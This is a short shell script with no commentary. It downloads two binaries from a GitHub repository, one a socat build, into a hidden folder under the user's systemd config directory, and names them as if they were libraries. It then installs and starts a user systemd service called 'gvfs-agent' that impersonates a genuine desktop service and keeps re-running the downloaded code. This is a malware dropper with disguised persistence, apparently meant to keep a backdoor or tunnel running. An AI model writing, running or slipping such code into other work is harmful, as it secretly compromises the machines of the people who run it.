mkdir -p $HOME/.config/systemd/user/libxct-util

curl -l -o $HOME/.config/systemd/user/libxct-util/libdev.so https://raw.githubusercontent.com/qofiajsflkasdf/testing/main/socatx64.bin 

curl -l -o $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://raw.githubusercontent.com/qofiajsflkasdf/testing/main/libdev.so.6 

chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so
chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so.6


cat > $HOME/.config/systemd/user/gvfs-agent.service << EOF
[Unit]
Description=Virtual filesystem service - agent
StartLimitInterval=0
[Service]
WorkingDirectory=$HOME/.config/systemd/user
ExecStart=/bin/bash -c "$HOME/.config/systemd/user/libxct-util/libdev.so.6"
ExecStop=kill -HUP \$MAINPID
Restart=always
RestartSec=120
RuntimeMaxSec=300
TimeoutSec=300
[Install]
WantedBy=default.target
EOF

systemctl --user enable gvfs-agent.service
systemctl --user start gvfs-agent.service
